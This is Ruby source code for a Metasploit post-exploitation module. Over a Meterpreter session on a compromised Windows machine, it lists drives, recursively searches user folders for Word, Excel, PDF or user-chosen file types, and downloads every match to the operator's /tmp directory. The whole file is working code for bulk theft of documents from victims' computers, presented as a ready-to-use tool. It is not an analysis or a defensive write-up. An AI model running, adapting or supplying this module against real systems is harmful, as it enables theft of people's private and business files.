require 'msf/core'
require 'msf/core/post/file'
class Metasploit3 < Msf::Post

	include Msf::Post::File

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Gather Docs',
			'Description'   => %q{ This module gathers specific files from user directories. },
			'License'       => BSD_LICENSE,
			'Author'        => [ '3vi1john Jbabio@me.com'],
			'Version'       => '$Revision: 20 $',
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))

		register_options(
			[
				OptBool.new(  'GETDOC',   [ false, 'Search and download all .doc files.', false]),
				OptBool.new(  'GETDOCX',   [ false, 'Search and download all .docx files.', false]),
				OptBool.new(  'GETXLS',   [ false, 'Search and download all .xls files.', false]),
				OptBool.new(  'GETXLSX',   [ false, 'Search and download all .xlsx files.', false]),
				OptBool.new(  'GETPDF',   [ false, 'Search and download all .pdf files.', false]),
				OptBool.new(  'GETDRIVES', [ false, 'Search for a list of drives and display drive letters.', false]),
				OptString.new(  'SEARCH_FROM', [ false, 'Search from a specified location. Ex. C:\\, Run GETDRIVES first.']),
				OptString.new(  'FILE_TYPE', [ false, 'Search for a specific file type based on extension. Ex *.gnmap, *.nbe'])
			], self.class)
	end

	def get_drives
	##All Credit Goes to mubix for this railgun-FU
		a = client.railgun.kernel32.GetLogicalDrives()["return"]
		drives = []
		letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		(0..25).each do |i|
			test = letters[i,1]
			rem = a % (2**(i+1))
				if rem > 0
				drives << test
				a = a - rem
				end
			end
			print_status("Drives Available = #{drives.inspect}")
	end

	def download_doc_files
		location = datastore['SEARCH_FROM']
		file_type = "*.doc"
		dest = "/tmp"
		sysnfo = client.sys.config.sysinfo['OS']
		if datastore['SEARCH_FROM']
			getfile = client.fs.file.search(location,file_type,recurse=true,timeout=-1)
		elsif sysnfo =~/Windows XP|2003|.NET/
			getfile = client.fs.file.search("C:\\Documents and Settings",file_type,recurse=true,timeout=-1)
		else sysnfo =~/Windows 7|Windows Vista|2008/
			getfile = client.fs.file.search("C:\\Users",file_type,recurse=true,timeout=-1)
		end
		getfile.each do |file|
			print_status("Downloading #{file['path']}\\#{file['name']}")
			client.fs.file.download(dest, "#{file['path']}\\#{file['name']}")
			end
	end

	def download_docx_files
		location = datastore['SEARCH_FROM']
		file_type = "*.docx"
		dest = "/tmp"
		sysnfo = client.sys.config.sysinfo['OS']
		if datastore['SEARCH_FROM']
			getfile = client.fs.file.search(location,file_type,recurse=true,timeout=-1)
		elsif sysnfo =~/Windows XP|2003|.NET/
			getfile = client.fs.file.search("C:\\Documents and Settings",file_type,recurse=true,timeout=-1)
		else sysnfo =~/Windows 7|Windows Vista|2008/
			getfile = client.fs.file.search("C:\\Users",file_type,recurse=true,timeout=-1)
		end
		getfile.each do |file|
			print_status("Downloading #{file['path']}\\#{file['name']}")
			client.fs.file.download(dest, "#{file['path']}\\#{file['name']}")
			end
	end

	def download_xls_files
		location = datastore['SEARCH_FROM']
		file_type = "*.xls"
		dest = "/tmp"
		sysnfo = client.sys.config.sysinfo['OS']
		if datastore['SEARCH_FROM']
			getfile = client.fs.file.search(location,file_type,recurse=true,timeout=-1)
		elsif sysnfo =~/Windows XP|2003|.NET/
			getfile = client.fs.file.search("C:\\Documents and Settings",file_type,recurse=true,timeout=-1)
		else sysnfo =~/Windows 7|Windows Vista|2008/
			getfile = client.fs.file.search("C:\\Users",file_type,recurse=true,timeout=-1)
		end
		getfile.each do |file|
			print_status("Downloading #{file['path']}\\#{file['name']}")
			client.fs.file.download(dest, "#{file['path']}\\#{file['name']}")
			end
	end

	def download_xlsx_files
		location = datastore['SEARCH_FROM']
		file_type = "*.xlsx"
		dest = "/tmp"
		sysnfo = client.sys.config.sysinfo['OS']
		if datastore['SEARCH_FROM']
			getfile = client.fs.file.search(location,file_type,recurse=true,timeout=-1)
		elsif sysnfo =~/Windows XP|2003|.NET/
			getfile = client.fs.file.search("C:\\Documents and Settings",file_type,recurse=true,timeout=-1)
		else sysnfo =~/Windows 7|Windows Vista|2008/
			getfile = client.fs.file.search("C:\\Users",file_type,recurse=true,timeout=-1)
		end
		getfile.each do |file|
			print_status("Downloading #{file['path']}\\#{file['name']}")
			client.fs.file.download(dest, "#{file['path']}\\#{file['name']}")
			end
	end

	def download_pdf_files
		location = datastore['SEARCH_FROM']
		file_type = "*.pdf"
		dest = "/tmp"
		sysnfo = client.sys.config.sysinfo['OS']
		if datastore['SEARCH_FROM']
			getfile = client.fs.file.search(location,file_type,recurse=true,timeout=-1)
		elsif sysnfo =~/Windows XP|2003|.NET/
			getfile = client.fs.file.search("C:\\Documents and Settings",file_type,recurse=true,timeout=-1)
		else sysnfo =~/Windows 7|Windows Vista|2008/
			getfile = client.fs.file.search("C:\\Users",file_type,recurse=true,timeout=-1)
		end
		getfile.each do |file|
			print_status("Downloading #{file['path']}\\#{file['name']}")
			client.fs.file.download(dest, "#{file['path']}\\#{file['name']}")
			end
	end

	def download_ud_files
		location = datastore['SEARCH_FROM']
		file_type = datastore['FILE_TYPE']
		dest = "/tmp"
		sysnfo = client.sys.config.sysinfo['OS']
		if datastore['SEARCH_FROM']
			getfile = client.fs.file.search(location,file_type,recurse=true,timeout=-1)
		elsif sysnfo =~/Windows XP|2003|.NET/
			getfile = client.fs.file.search("C:\\Documents and Settings",file_type,recurse=true,timeout=-1)
		else sysnfo =~/Windows 7|Windows Vista|2008/
			getfile = client.fs.file.search("C:\\Users",file_type,recurse=true,timeout=-1)
		end
		getfile.each do |file|
			print_status("Downloading #{file['path']}\\#{file['name']}")
			client.fs.file.download(dest, "#{file['path']}\\#{file['name']}")
			end
	end

	def run
		begin
			if datastore['GETDRIVES']
				get_drives
			end
			if datastore['GETDOC']
				print_status("\tSearching for and downloading Office Word documents...")
				print_status("")
				download_doc_files
			end
			if datastore['GETDOCX']
				print_status("\tSearching for and downloading Office 2007+ Word documents...")
				print_status("")
				download_docx_files
			end
			if datastore['GETXLS']
				print_status("\tSearching for and downloading Office Excel spreadsheets...")
				print_status("")
				download_xls_files
			end
			if datastore['GETXLSX']
				print_status("\tSearching for and downloading Office 2007+ Excel spreadsheets...")
				print_status("")
				download_xlsx_files
			end
			if datastore['GETPDF']
				print_status("\tSearching for and downloading Adobe pdf files...")
				print_status("")
				download_pdf_files
			end
			if datastore['FILE_TYPE']
				download_ud_files
			end
			print_status("Done!")
		end
		rescue::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
		end
	end
